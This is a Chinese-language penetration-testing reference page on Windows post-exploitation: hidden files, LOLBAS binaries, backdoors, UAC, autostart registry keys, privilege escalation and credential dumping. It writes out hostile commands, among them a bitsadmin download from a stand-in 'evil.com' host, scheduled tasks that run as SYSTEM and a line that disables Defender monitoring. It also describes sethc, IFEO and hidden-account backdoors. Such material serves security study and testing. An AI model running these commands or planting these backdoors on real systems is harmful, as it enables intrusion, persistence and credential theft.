持久化 - Windows
========================================

隐藏文件
----------------------------------------
- 创建系统隐藏文件
    - ``attrib +s +a +r +h filename`` / ``attrib +s +h filename``
- 利用NTFS ADS (Alternate　Data　Streams) 创建隐藏文件
- 利用Windows保留字
    - ``aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9``

LOLBAS
----------------------------------------

简介
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念。

这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等。

常见程序
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- appsyncvpublishing.exe
    - 执行powershell
- bitsadmin.exe
    - 下载文件 ``bitsadmin /transfer <job_name> /priority <priority> <remote_path> <local_path>``
    - 下载文件 ``bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1``
    - 复制文件 ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset``
    - 代码执行 ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset``
- cdb.exe
- certutil.exe
    - 可安装、备份、删除、管理和执行证书
    - 证书存储相关功能
- cmd.exe
- cmstp.exe
- control.exe
    - `加载dll <https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/>`_
- csc.exe
    - 编译 C# 载荷
- cscript.exe
    - 执行脚本
- extexport.exe
- expand.exe
    - 展开一个或多个压缩文件
- forfiles.exe
    - ``forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe``
- mofcomp.exe
- makecab.exe
- msbuild.exe
    - 构建应用程序
- mshta.exe
    - HTML应用
- msiexec.exe
    - 安装msi
    - 加载dll
- msxsl.exe
    - 处理XSL程序
- netsh.exe
- installutil.exe
    - 安装/卸载程序组件
- IEExec.exe
    - .NET Framework附带程序
- powershell.exe
- psexec.exe
- reg.exe
    - 注册表控制台
- regedit.exe
    - 注册表修改
- regsvr32.exe
    - 注册动态链接库/ActiveX控件
- rundll32.exe
    - 执行DLL文件中的内部函数
- sc.exe
    - 查看服务状态管理
- schtasks.exe
    - 定时计划任务
- shred
    - 重复写入文件，防止文件恢复
- type.exe
    - 利用ads隐藏文件 ``type <filepath> <target_file:ads>``
- wmic.exe
    - Windows管理工具
- windbg.exe
- winrm.exe
- wscript.exe
    - 脚本引擎
- waitfor.exe
    - 用于同步网络中计算机，可以发送或等待系统上的信号。

后门
----------------------------------------

sethc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
``sethc.exe`` 是 Windows系统在用户按下五次shift后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换 ``sethc.exe`` 的方式留下后门，在密码输入页面输入五次shift即可获得权限。

映像劫持
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在高版本的Windows中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。

具体操作为在注册表的 ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Option`` 下添加项 ``sethc.exe`` ，然后在 ``sethc.exe`` 这个项中添加 ``debugger`` 键，键值为恶意程序的路径。

定时任务
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Windows下有 ``schtasks`` 和 ``at`` 两种计划任务机制。 其中 ``at`` 在较高版本的Windows中已经弃用。

设置命令为 ``schtasks /create /tn "TEST_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"`` 、 ``schtasks /create /tn "TEST_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"`` 。删除命令为 ``schtasks /delete /tn "TEST_OnLogon" /f`` 。

登录脚本
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Windows可以在用户登录前执行脚本，使用 ``HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`` 设置。

也可在 ``HKCU\Environment\`` 路径下设置 ``UserInitMprLogonScript`` 来实现。

屏幕保护程序
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Windows可以自定义屏幕保护程序，使用 ``HKEY_CURRENT_USER\Control Panel\Desktop`` 设置。

隐藏用户
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Windows可以使用在用户名后加入 ``$`` 来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。

在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看。

CLR
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET产品构建的运行环境，可以粗略地理解为.NET虚拟机。

.NET程序的运行离不开CLR，因此可以通过劫持CLR的方式实现后门。

Winlogon Helper DLL后门
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Winlogon是一个Windows组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在Windows登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。

注册表位置如下：

- ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`` 用于执行exe程序
- ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`` 用于执行exe程序
- ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify`` 用于执行dll文件

UAC
----------------------------------------

简介
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
UAC (User Account Control) 是Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。

当用户登陆Windows时，每个用户都会被授予一个access token，这个token中有security identifier (SID) 的信息，决定了用户的权限。

会触发UAC的操作
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 以管理员权限启动应用
- 修改系统、UAC设置
- 修改没有权限的文件或者目录（ %SystemRoot% / %ProgramFiles% 等 ） 
- 修改ACL (access control list)
- 安装驱动
- 增删账户，修改账户类型，激活来宾账户

ByPass
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- DLL相关
- 进程注入
- 注册表

自启动
----------------------------------------

基于注册表的自启动
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是 ``Run`` 和 ``RunOnce`` ，其中RunOnce和Run区别在于RunOnce的键值只作用一次，执行完毕后会自动删除。

注册表如下：

- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run``
- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce``
- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run``
- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce``
- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx``

基于策略的自启动注册表设置如下：

- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run``
- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run``

设置启动文件夹注册表位置如下：

- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders``
- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders``
- ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders``
- ``HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders``

设置服务启动项注册表位置如下：

- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce``
- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce``
- ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices``
- ``HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices``

用户自启动位置 ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit`` 、 ``HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell`` ，其中 ``Userinit`` 键允许指定用逗号分隔的多个程序。

如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：

- ``HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive``
- ``HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure``
- ``HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut``
- ``HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE``

基于特定目录的自启动
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
自启动目录， ``C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`` 目录对特定用户生效， ``C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`` 对所有用户生效。在NT6以前，两个目录为 ``C:\Documents and Settings\Username\Start Menu\Programs\StartUp`` / ``C:\Documents and Settings\All Users\Start Menu\Programs\StartUp`` 。
 
权限提升
----------------------------------------
权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或者其他类似的漏洞，以获得较高的权限。

逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。

任意写文件利用
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
在Windows中用户可以写的敏感位置主要有以下这些

+ 用户自身的文件和目录，包括 ``AppData`` ``Temp``
+ ``C:\`` ，默认情况下用户可以写入
+ ``C:\ProgramData`` 的子目录，默认情况下用户可以创建文件夹、写入文件
+ ``C:\Windows\Temp`` 的子目录，默认情况下用户可以创建文件夹、写入文件

具体的ACL信息可用AccessChk, 或者PowerShell的 ``Get-Acl`` 命令查看。

可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的dll，利用dll的加载执行来获取权限。

MOF
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
MOF是Windows系统的一个文件（ ``c:/windows/system32/wbem/mof/nullevt.mof`` ）叫做"托管对象格式"，其作用是每隔五秒就会去监控进程创建和死亡。

当拥有文件上传的权限但是没有Shell时，可以上传定制的mof文件至相应的位置，一定时间后这个mof就会被执行。

一般会采用在mof中加入一段添加管理员用户的命令的vbs脚本，当执行后就拥有了新的管理员账户。

凭证窃取
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- Windows本地密码散列导出工具
    - mimikatz
    - lsass
    - wce
    - gsecdump
    - copypwd
    - Pwdump
    - ProcDump
        - https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
- Windows本地密码破解工具
    - L0phtCrack
    - SAMInside
    - Ophcrack
- 彩虹表破解
- 本机hash+明文抓取
- win8+win2012明文抓取
- ntds.dit的导出+QuarkPwDump读取分析
- vssown.vbs + libesedb + NtdsXtract
- ntdsdump
- 利用powershell(DSInternals)分析hash
- 使用 ``net use \\%computername% /u:%username%`` 重置密码尝试次数
- 限制读取时，可crash操作系统后，在蓝屏的dump文件中读取

其他
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 组策略首选项漏洞
- DLL劫持
- 替换系统工具，实现后门
- 关闭defender
    - ``Set-MpPreference -disablerealtimeMonitoring $true``
